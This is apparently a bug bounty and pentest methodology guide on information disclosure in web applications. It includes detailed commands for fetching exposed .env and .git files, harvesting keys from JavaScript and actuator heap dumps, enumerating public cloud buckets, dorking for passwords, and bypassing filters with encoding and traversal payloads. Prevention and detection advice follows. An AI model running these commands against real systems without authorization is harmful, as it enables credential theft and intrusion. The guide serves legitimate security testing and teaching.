---
title: Information Disclosure
---

# Information Disclosure

Information Disclosure, also known as information leakage, is a vulnerability class where a web application or system unintentionally exposes sensitive data to users who should not have access to it. In bug bounty and pentest reports, this ranges from low-impact server version headers all the way to exposed credentials, source code, PII, and internal infrastructure details — data that directly enables further compromise. The key insight is that most information disclosure bugs are not standalone findings; they are the starting point for chaining into something critical.

## Fundamentals of Information Disclosure

### Types of Information Disclosure

**1. Technical Information Disclosure**

- Server banners, software versions, and framework names in HTTP response headers
- Stack traces, debug output, and verbose error messages revealing file paths, query structure, or internal logic
- Source code exposed through backup files, `.git` directories, or misconfigured servers
- Internal IP addresses, hostnames, and network topology leaked in headers or error responses

**2. Credential and Secret Disclosure**

- API keys, tokens, and secrets hardcoded in JavaScript files, HTML comments, or configuration files
- Database credentials in exposed `.env` files, backup archives, or version control history
- Cloud service keys (AWS, GCP, Azure) left in public repositories or accessible endpoints
- Private keys and certificates accessible via misconfigured storage or backup paths

**3. Personal Data Exposure (PII)**

- User data (email addresses, phone numbers, account IDs) returned from unprotected API endpoints
- Financial information, SSNs, or health data exposed through IDOR or missing access controls
- Password hashes leaked via verbose error messages or insecure API responses
- Internal user metadata (roles, permissions, tenant IDs) visible to other users

**4. Application Logic and Structure Disclosure**

- Internal endpoint paths listed in `robots.txt`, `sitemap.xml`, or JS source maps
- Database schema, table names, and column names revealed in SQL error messages
- Business logic, proprietary algorithms, or feature flags exposed in client-side code
- Hidden parameters, admin routes, and internal API structure exposed via source code or JS bundles

**5. Infrastructure and Configuration Disclosure**

- Directory listings on web servers with `autoindex` enabled
- Cloud storage bucket contents publicly readable (AWS S3, GCP, Azure Blob)
- Kubernetes configuration files, Docker compose files, or CI/CD pipeline configs accessible
- Swagger/OpenAPI specs, GraphQL introspection, or WSDL files exposing full API structure

**6. Historical Data Disclosure**

- Exposed `.git` directory containing full commit history, credentials, and deleted files
- Wayback Machine and archive.org preserving old pages with sensitive data
- Cached or indexed sensitive pages discoverable via Google dorks
- Version control files (`.svn`, `.hg`) left in production deployments

### Base Concepts

- **Sensitive Data:** Any data whose exposure enables further attack or causes direct harm — credentials, PII, internal paths, infrastructure details, business logic
- **Severity Depends on Context:** A server version header is Low; the same server version combined with a known unpatched CVE becomes High. Always evaluate disclosure in context of what it enables
- **Direct vs. Indirect Impact:** Direct = PII or credentials exposed. Indirect = technical details used to plan further attacks
- **Chaining:** Information disclosure is most valuable when it feeds into another vulnerability — leaked path enables LFI, leaked key enables account takeover, leaked schema enables targeted SQLi

---

## Attack Surfaces

- **HTTP Response Headers:** `Server`, `X-Powered-By`, `X-AspNet-Version`, `X-Runtime`, `Via`, debug headers
- **Error pages and stack traces:** unhandled exceptions, SQL errors, framework debug pages
- **Exposed files and directories:**
    - `.env`, `.env.local`, `.env.production`, `.env.backup`
    - `.git/`, `.svn/`, `.hg/`, `.DS_Store`
    - `backup.zip`, `backup.tar.gz`, `db.sql`, `dump.sql`
    - `config.php`, `config.yml`, `settings.py`, `web.config`
    - `.bak`, `.old`, `.swp`, `.~`, `.orig`
    - `composer.json`, `package.json` (dependency versions)
- **Web crawler files:** `robots.txt`, `sitemap.xml`, `crossdomain.xml`, `clientaccesspolicy.xml`
- **JavaScript and source maps:** `.js.map` files, bundled SPA code, inline comments with keys
- **API endpoints:**
    - `/api/v1/debug`, `/api/config`, `/api/health`, `/api/status`
    - GraphQL introspection (`__schema`, `__type`)
    - Swagger UI (`/swagger-ui.html`, `/api-docs`, `/openapi.json`)
    - Actuator endpoints (`/actuator`, `/actuator/env`, `/actuator/mappings`, `/actuator/heapdump`)
- **Cloud storage:** publicly readable S3 buckets, GCS buckets, Azure Blob containers
- **Version control history:** full commit history recoverable from exposed `.git/`
- **Admin and debug interfaces:** `/phpinfo.php`, `/info.php`, `/_profiler`, `/debug/`, `/trace`
- **Log files:** `/logs/`, `/error.log`, `/access.log`, `/debug.log` left accessible
- **Wayback Machine / cached pages:** old URLs with tokens, keys, or sensitive data still indexed

---

## Exploitation and Bypassing Defenses

### Case 1: Passive Reconnaissance

Google Dorking
site:target.com ext:env OR ext:log OR ext:sql OR ext:bak
site:target.com "DB_PASSWORD" OR "API_KEY" OR "SECRET"
site:target.com inurl:config OR inurl:backup OR inurl:debug
site:target.com filetype:json "api_key"

GitHub Dorking
`# Search: org:targetorg "api_key" OR "secret" OR "password"
# Use: github.com/trufflesecurity/trufflehog`

Wayback Machine
`Check old URLs for leaked data
waybackurls target.com | grep -i "token\|key\|secret\|password\|debug"
# Tool: github.com/tomnomnom/waybackurls`

Certificate Transparency
`# Find subdomains
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u`

### Case 2: HTTP Header Analysis

Every response header tells you something. Check them all.

Inspect response headers
`curl -I https://target.com

# Look for:
# Server: Apache/2.4.41 (Ubuntu)        ← version + OS
# X-Powered-By: PHP/7.4.3               ← language version
# X-AspNet-Version: 4.0.30319           ← .NET version
# X-Runtime: Ruby                        ← framework
# Via: 1.1 vegur (http/1.1)             ← proxy/CDN details
# X-Generator: Drupal 8                  ← CMS version

# Also check non-standard debug headers:
# X-Debug-Token, X-Debug-Token-Link (Symfony profiler)
# X-Robots-Tag, internal IPs in X-Forwarded-For`

### Case 3: Probe Common Sensitive Paths

Use ffuf or dirsearch for file and directory discovery
`ffuf -u https://target.com/FUZZ -w /opt/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -mc 200,301,302,403 -t 50

dirsearch -u https://target.com -e php,bak,old,zip,env,sql,log,json,yml,yaml,config

# Targeted checks for high-value paths
for path in .env .git/HEAD .git/config phpinfo.php info.php \
  backup.zip db.sql config.bak web.config .DS_Store \
  robots.txt sitemap.xml swagger-ui.html api-docs \
  actuator/env actuator/heapdump _profiler/open; do
    curl -s -o /dev/null -w "%{http_code} $path\n" https://target.com/$path
done`

### Case 4: Exploit Exposed .git Directory

An exposed `.git/` folder is one of the highest-value findings — it often gives you the entire source code, including commit history and deleted files.

`# Verify exposure
curl https://target.com/.git/HEAD
# If returns "ref: refs/heads/main" → exposed

# Download and reconstruct full source
git clone https://github.com/arthaud/git-dumper
python3 git_dumper.py https://target.com/.git/ ./output_dir

# Once you have source code, search for secrets
grep -rn "password\|secret\|api_key\|token\|DB_PASS" ./output_dir/
grep -rn "AKIA\|sk_live\|xox[baprs]-" ./output_dir/   # AWS keys, Stripe, Slack

# Check full git history for deleted secrets
cd ./output_dir
git log --all --oneline
git show <commit_hash>
git log -p --all | grep -i "password\|secret\|key"`

### Case 5: Exploit Exposed .env and Config Files

`# Direct fetch
curl https://target.com/.env
curl https://target.com/.env.local
curl https://target.com/.env.production

# What to look for in .env files:
# DB_PASSWORD, DB_USERNAME, DATABASE_URL
# APP_SECRET, SECRET_KEY, JWT_SECRET
# AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY
# STRIPE_SECRET_KEY, SENDGRID_API_KEY, TWILIO_AUTH_TOKEN
# MAIL_PASSWORD, SMTP_PASSWORD

# Verify if AWS keys are active (read-only check — do not escalate without authorization)
aws sts get-caller-identity --access-key-id AKIA... --secret-access-key ...`

### Case 6: Extract Secrets from JavaScript Files

SPAs bundle environment variables and API keys into their JS bundles at build time.

`# Download and grep all JS files
# Using gau + waybackurls to find JS files
gau target.com | grep "\.js$" | sort -u > jsfiles.txt

# Fetch and search each file for secrets
while read url; do
    curl -s "$url" | grep -oE "(api_key|apikey|secret|token|password|auth)[\"']?\s*[:=]\s*[\"'][^\"']{10,}[\"']"
done < jsfiles.txt

# Use SecretFinder for automation
python3 SecretFinder.py -i https://target.com/static/app.js -o cli

# Check for exposed source maps (.js.map files)
# These contain the original unminified source code
curl https://target.com/static/app.bundle.js.map | python3 -m json.tool | head -100
# Use: sourcemapper (github.com/denandz/sourcemapper)
sourcemapper -url https://target.com/static/app.bundle.js.map -output ./source_extracted/`

### Case 7: Trigger Verbose Error Messages

Forcing error conditions often reveals stack traces, internal paths, and framework details.

`# Cause type errors by sending unexpected input types
# If endpoint expects integer ID:
GET /api/user/id=abc
GET /api/user/id=1'
GET /api/user/id[]=1&id[]=2    # array injection
GET /api/user/id=../../../etc/passwd

# Force SQL errors
GET /api/items?sort=1 ORDER BY 100--
GET /api/items?id=1 AND SLEEP(0)--

# Send malformed Content-Type
POST /api/data with Content-Type: application/xml  (if it expects JSON)

# In Burp: try sending unexpected parameter types to every endpoint
# A full stack trace is often a High severity finding on its own`

### Case 8: Check API Documentation Endpoints

GraphQL introspection Enabled
`curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'`

Common API doc paths
`curl https://target.com/swagger-ui.html
curl https://target.com/api-docs
curl https://target.com/openapi.json
curl https://target.com/v2/api-docs
curl https://target.com/swagger.json`

Spring Boot Actuator endpoints
`curl https://target.com/actuator
curl https://target.com/actuator/env          # environment variables, keys
curl https://target.com/actuator/mappings     # all routes
curl https://target.com/actuator/heapdump     # heap dump — contains live memory
curl https://target.com/actuator/logfile      # application logs
curl https://target.com/actuator/httptrace    # recent HTTP requests with headers`

### Case 9: Inspect robots.txt and Crawler Files

`curl https://target.com/robots.txt
# Look for Disallow entries — these are often the most sensitive paths:
# /admin, /backup, /internal, /api-v2, /staff, /debug

curl https://target.com/sitemap.xml
# Cross-reference all URLs against authentication — some may be accessible unauthenticated

# crossdomain.xml and clientaccesspolicy.xml
curl https://target.com/crossdomain.xml
# "<allow-access-from domain="*"/>" = very permissive CORS for Flash/Silverlight`

### Case 10: Cloud Storage Enumeration

`# AWS S3 — check if bucket is public
aws s3 ls s3://target-bucket-name --no-sign-request
aws s3 ls s3://target.com --no-sign-request
aws s3 ls s3://target-backup --no-sign-request

# Common bucket naming patterns to try:
# target.com, target-backup, target-dev, target-staging, target-assets
# target-media, target-uploads, target-data, target-logs

# GCP storage
curl https://storage.googleapis.com/target-bucket/
curl "https://www.googleapis.com/storage/v1/b/target-bucket/o"

# Azure Blob
curl https://targetaccount.blob.core.windows.net/target-container/?restype=container&comp=list

# Use cloud_enum for automated multi-cloud enumeration
python3 cloud_enum.py -k target -l results.txt`

### Bypassing Defenses

| **Technique** | **Example** | **Testing Goal** |
| --- | --- | --- |
| Path case variation | `/.Git/HEAD`, `/.ENV` | Case-insensitive OS bypass |
| Double encoding | `/%2Egit/HEAD` | WAF/filter bypass for dot paths |
| Null byte injection | `/config.php%00.jpg` | Extension filter bypass |
| Trailing slash | `/.git/` vs `/.git` | Different server handling |
| Alternative extensions | `config.php.bak`, `config.php~`, `config.php.swp` | Backup file variants |
| Parameter pollution | `?debug=true`, `?test=1`, `?env=dev` | Debug mode activation |
| HTTP method switching | `TRACE /admin`, `OPTIONS /api/config` | Reveal headers, allowed methods |
| Accept header manipulation | `Accept: application/json` on HTML endpoint | Different response format with more data |
| Bypassing GraphQL introspection query with newline |     `{
"query": "query{__schema
{queryType{name}}}"
}` | Spaces, new lines and commas are ignored by GraphQL but not by flawed regex |
| Changing Introspection request method |  `GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D` | Try a GET request, or a POST request with a content-type of `x-www-form-urlencoded` |

---

## Advanced Attack Scenarios

### 1. Source Code Disclosure to RCE Chain

- Exposed `.git/` repository may reveal source code, enabling identification of vulnerabilities that could lead to RCE.
- Exposed `.env` file may disclose database credentials, resulting in unauthorized database access.
- Exposed configuration files may reveal internal credentials, facilitating access to internal services and lateral movement.

### 2. JavaScript Secret to Account Takeover

- SPA JS bundle contains hardcoded admin API token or service account key
- Token used directly to call privileged API endpoints
- Escalated from Low (info disclosure) to Critical (account takeover / data exfil)

**Real report pattern (HackerOne):** Researcher found an AWS `ACCESS_KEY_ID` and `SECRET_ACCESS_KEY` hardcoded in a public JavaScript file. The keys had S3 read/write permissions on production buckets. Started as Low information disclosure, escalated to Critical data breach severity on submission.

### 3. Spring Boot Actuator Full Compromise

- `/actuator/env` exposes all environment variables including database passwords and API keys
- `/actuator/heapdump` contains a full heap dump — running strings on it extracts live session tokens, passwords, and keys from memory
- `/actuator/httptrace` shows recent HTTP requests including Authorization headers

`# Extract secrets from heap dump
wget https://target.com/actuator/heapdump -O heapdump.hprof
strings heapdump.hprof | grep -i "password\|secret\|key\|token" | head -50
# Or analyze in Eclipse Memory Analyzer (MAT)`

### 4. GraphQL Introspection to Business Logic Exposure

- Introspection disabled on `/graphql` but enabled on `/graphql/playground` or `/v2/graphql`
- Full schema reveals mutation names like `updateUserRole`, `deleteAdminUser`, `bypassMFA`
- Combined with IDOR or missing auth → privilege escalation

### 5. Version Disclosure to Known CVE Exploitation

- `X-Powered-By: PHP/7.2.0` → search CVE database for PHP 7.2.x known vulnerabilities
- `Server: Apache/2.4.49` → CVE-2021-41773 (path traversal and RCE — CVSS 9.8)
- Framework version in error page → target specific deserialization or injection CVE

### 6. robots.txt Enumeration to Hidden Admin Access

- `Disallow: /admin-portal-v2/` in robots.txt
- Admin portal accessible without authentication or with default credentials
- Information disclosure as the starting point, authentication bypass as the actual impact

### 7. IDOR Exposing PII at Scale

- API endpoint returns full user object including internal fields: SSN, account balance, raw password hash, phone number
- By iterating user IDs, attacker can harvest PII for thousands of accounts
- Single endpoint disclosure with parameter manipulation = GDPR-level data breach

### 8. Webpack Source Map Extraction

- Production `.js.map` files expose full original TypeScript/React source code
- Source contains hardcoded environment variable references, internal endpoint paths, auth logic
- Use `sourcemapper` or browser DevTools to extract and read unminified source

---

## Service-Specific Scenarios

| **Surface** | Misconfiguration | **Indicator** |
| --- | --- | --- |
| **PHP applications** | `phpinfo()` page, verbose errors | `PHP Warning:`, `Fatal error: in /var/www/` |
| **Django (debug=True)** | Full stack trace with source code lines | Yellow debug page with `DEBUG = True` |
| **Spring Boot** | Actuator endpoints exposed | `/actuator/env` returns JSON with secrets |
| **Laravel** | Debug page, `.env` file, APP_DEBUG=true | Ignition error page with variable dump |
| **Node.js** | Stack traces with full file paths | `Error: Cannot find module` with `/home/node/app/` |
| **ASP.NET** | YSOD (Yellow Screen of Death) | `Server Error in '/' Application` |
| **GraphQL** | Introspection enabled | `__schema`, `__type` in query response |
| **Swagger/OpenAPI** | Full API documentation exposed | `/swagger-ui.html`, `/api-docs`, `/openapi.json` |
| **Git exposed** | Full source code recoverable | `/.git/HEAD` returns `ref: refs/heads/` |
| **AWS S3** | Public bucket with sensitive files | `ListBucketResult` XML response |
| **Jenkins** | Build logs, environment variables | `/env`, `/script` console accessible |
| **Kubernetes** | Config files, service account tokens | `kubectl config view`, `/etc/kubernetes/` paths |

### Example: Spring Boot Actuator Full Exploitation

`# Step 1: Confirm exposure
curl https://target.com/actuator
# Returns: {"_links":{"env":{},"health":{},"heapdump":{},...}}

# Step 2: Dump environment variables
curl https://target.com/actuator/env | python3 -m json.tool
# Look for: DB_PASSWORD, DATASOURCE_PASSWORD, SPRING_DATASOURCE_PASSWORD
# Note: values may be masked as "****" in newer versions — try heapdump instead

# Step 3: Download heap dump and extract secrets
curl https://target.com/actuator/heapdump -o heap.hprof
strings heap.hprof | grep -Ei "(password|secret|key|token|credential)" | sort -u

# Step 4: Check recent HTTP requests
curl https://target.com/actuator/httptrace | python3 -m json.tool
# May contain full request headers including Authorization: Bearer <token>`

### Test Cases Quick Reference

| **Scenario** | **Action** | **Expected Outcome** |
| --- | --- | --- |
| `.git/` exposed | `git-dumper` to reconstruct source | Full source code, commit history, deleted secrets |
| `.env` accessible | Direct `curl` fetch | Database creds, API keys, secrets |
| Verbose error page | Submit invalid input (SQL chars, arrays) | Stack trace with paths, query structure, framework |
| JS source map | Fetch `.js.map` file | Original unminified source code |
| Actuator exposed | `/actuator/env` and `/actuator/heapdump` | Environment variables, live memory secrets |
| GraphQL introspection | `{__schema{types{name}}}` | Full API schema including hidden mutations |
| S3 bucket public | `aws s3 ls s3://target --no-sign-request` | Directory listing, file download |
| robots.txt | Read and test every Disallow path | Hidden endpoints, admin panels |
| Swagger exposed | Browse `/swagger-ui.html` | Full API documentation with auth details |
| Backup file | Try `config.php.bak`, `config.php~`, `index.php~` | Source code with hardcoded credentials |

---

## Detection Techniques

### Manual Detection

1. **Passive Recon** 
    - Google dorks for sensitive file types and keywords
    - GitHub/GitLab search for org secrets and hardcoded credentials
    - Wayback Machine for old URLs with tokens or debug data
    - Certificate transparency logs for subdomains
2. **Inspect HTTP Headers**
    - Check every response header for version, framework, and technology strings
    - Use Burp to passively collect headers across the entire target
    - Flag anything with version numbers or internal path references
3. **Forced Error Generation**
    - Submit malformed input to every parameter — strings where ints expected, arrays, special characters
    - Try invalid routes, methods, and Content-Type values
    - Look for stack traces, SQL error messages, or partial source code in response
4. **Crawler File Review**
    - Read `robots.txt` and test every Disallow entry directly
    - Parse `sitemap.xml` and check authenticated vs unauthenticated access for each URL
5. **JavaScript Analysis**
    - Open browser DevTools, Sources tab and observe all loaded JS files.
    - Search for `key`, `secret`, `token`, `password`, `api`, `auth` in JS sources
    - Search for information in developer’s comment.
    - Check for `.js.map` files at the same path with `.map` appended
6. **Inspect Browser Storage**
    - Open browser DevTools, Application tab and review Local Storage and Session Storage for sensitive data (tokens, API keys, credentials, PII, internal URLs).
    - Check IndexedDB and Cache Storage for cached API responses, user data, or other sensitive information.

### Automated Detection

**1. ffuf / dirsearch — directory and file fuzzing**

`ffuf -u https://target.com/FUZZ -w /opt/seclists/Discovery/Web-Content/raft-large-files.txt \
  -mc 200,301 -t 50 -o results.json

dirsearch -u https://target.com -e env,bak,old,zip,sql,log,conf,yml,json -t 30`

**2. truffleHog — secret scanning in git repos and filesystems**

`# Scan a GitHub org or repo for secrets
trufflehog github --org=targetorg
trufflehog git https://github.com/target/repo

# Scan a directory (after git-dumper)
trufflehog filesystem ./extracted_source/`

**3. git-dumper — reconstruct source from exposed .git**

`pip install git-dumper
git-dumper https://target.com/.git/ ./output/`

**4. gitleaks — secrets in git history**

`# After cloning or dumping the repo
gitleaks detect --source=./output/ --report-path=leaks.json
gitleaks detect --source=./output/ --log-opts="--all"   # check all branches`

**5. SecretFinder — secrets in JavaScript files**

`python3 SecretFinder.py -i https://target.com -e -o cli
# -e = extract all JS from the URL first`

**6. Nuclei — automated info disclosure templates**

`nuclei -u https://target.com -tags exposure,config,backup,token,disclosure
nuclei -u https://target.com -tags springboot          # actuator endpoints
nuclei -u https://target.com -tags git                 # git exposure
nuclei -u https://target.com -tags env                 # .env file exposure`

**7. cloud_enum — cloud storage enumeration**

`python3 cloud_enum.py -k targetname -k target.com --disable-azure`

**8. waybackurls + gau — find old and archived sensitive URLs**

`echo "target.com" | gau | grep -Ei "\.(env|bak|sql|log|zip|config|old|backup)$"
waybackurls target.com | grep -i "token\|apikey\|secret\|debug\|admin"`

**9. sourcemapper — extract JS source maps**

`sourcemapper -url https://target.com/static/app.bundle.js.map \
  -output ./extracted_source/`

---

## Impact

- An exposed `.env` file with active cloud keys hands an attacker full access to your database, storage buckets, and every connected service.
- A public `.git/` directory lets anyone reconstruct entire source code including deleted files and commit history.
- Spring Boot Actuator endpoints like `/actuator/heapdump` leak live memory — running strings on the dump extracts active session tokens, passwords, and API keys from currently running processes.
- Verbose stack traces reveal internal file paths, database query structure, and framework versions.
- JavaScript source maps expose the original unminified frontend source code including hardcoded API keys, internal endpoint paths, and auth logic that was never meant to be public.
- An unprotected API endpoint returning PII such as emails, SSNs, financial data which is a direct GDPR/HIPAA violation and a data breach.
- GraphQL introspection left on in production hands an attacker your full API schema including hidden mutations, admin operations, and internal data types.
- Server version headers alone are Low severity, but paired with a known unpatched CVE they become the first step toward full server compromise.

---

## Prevention Techniques

- Turn off debug mode in every production environment like Django `DEBUG=False`, Laravel `APP_DEBUG=false`, Spring `management.endpoints.web.exposure.exclude=*`.
- Return generic error messages to users. Log the full details only on server-side.
- Block access to sensitive file extensions at the web server level such as `.env`, `.bak`, `.sql`, `.log`, `.swp`, `.zip` should never be served directly.
- Disable directory listing:  Apache: `Options -Indexes`, Nginx: `autoindex off`.
- Strip server version headers:  Apache: `ServerTokens Prod`, Nginx: `server_tokens off`.
- Never deploy `.git/`, `.svn/`, or `.hg/` directories to production servers.
- Store all secrets in a secrets manager like HashiCorp Vault, AWS Secrets Manager, or Azure Key Vault. Never hardcode in source files or commit `.env` to version control.
- Add `.env` to `.gitignore` before the first commit. Use `pre-commit` hooks with `gitleaks` or `detect-secrets` to catch secrets before they reach the repo.
- Dont expose sensitive actuator endpoints. Implement authentication for everything else or disable entirely.
- Disable GraphQL introspection in production.
- Run `trufflehog` or `gitleaks` as part of your CI/CD pipeline to catch leaked secrets before they ship.
- Set cloud storage to deny-all by default. Enable AWS S3 Block Public Access at the account level. Require explicit grants for anything public-facing.

---

## Tools

| **Tool** | **Purpose** |
| --- | --- |
| [git-dumper](https://github.com/arthaud/git-dumper) | Reconstruct source code from exposed `.git/` |
| [truffleHog](https://github.com/trufflesecurity/trufflehog) | Secret scanning in git history, filesystems, S3 |
| [gitleaks](https://github.com/gitleaks/gitleaks) | Detect secrets in git repos and history |
| [SecretFinder](https://github.com/m4ll0k/SecretFinder) | Extract secrets from JavaScript files |
| [sourcemapper](https://github.com/denandz/sourcemapper) | Extract source from `.js.map` files |
| [dirsearch](https://github.com/maurosoria/dirsearch) | Directory and file fuzzing |
| [ffuf](https://github.com/ffuf/ffuf) | Fast web fuzzer for paths and files |
| [Nuclei](https://github.com/projectdiscovery/nuclei) | Automated templates for info disclosure |
| [cloud_enum](https://github.com/initstring/cloud_enum) | Multi-cloud storage enumeration (S3, GCS, Azure) |
| [gau](https://github.com/lc/gau) | Fetch known URLs from archives and crawlers |
| [waybackurls](https://github.com/tomnomnom/waybackurls) | Fetch all Wayback Machine URLs for a domain |
| [Burp Suite](https://portswigger.net/burp) | Passive header collection, active fuzzing, JS analysis |
| [hakrawler](https://github.com/hakluke/hakrawler) | Fast web crawler to discover endpoints and JS files |

---

## Good to Read

- [HackerOne — How Information Disclosure Led to Critical Data Exposure](https://www.hackerone.com/blog/how-information-disclosure-vulnerability-led-critical-data-exposure)
- [HackerOne Report #2215434](https://hackerone.com/reports/2215434)
- [HackerOne Report #143064](https://hackerone.com/reports/143064)
- [Pentester.land — Source Code Disclosure via Exposed .git Folder](https://pentester.land/blog/source-code-disclosure-via-exposed-git-folder/)
- [Secrets in Plain Sight — HackerNasr (Medium)](https://medium.com/@HackerNasr/secrets-in-plain-sight-hunting-for-sensitive-data-disclosure-bd6d2f3c9987)

---

## References

- [https://portswigger.net/web-security/information-disclosure](https://portswigger.net/web-security/information-disclosure)
- [https://portswigger.net/web-security/information-disclosure/exploiting](https://portswigger.net/web-security/information-disclosure/exploiting)
- [https://www.invicti.com/blog/web-security/types-of-information-disclosure-vulnerabilities](https://www.invicti.com/blog/web-security/types-of-information-disclosure-vulnerabilities)
- [https://www.hackerone.com/blog/how-information-disclosure-vulnerability-led-critical-data-exposure](https://www.hackerone.com/blog/how-information-disclosure-vulnerability-led-critical-data-exposure)
- [https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-information-disclosure-vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-information-disclosure-vulnerabilities)
- [https://pentester.land/blog/source-code-disclosure-via-exposed-git-folder/](https://pentester.land/blog/source-code-disclosure-via-exposed-git-folder/)
- [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server)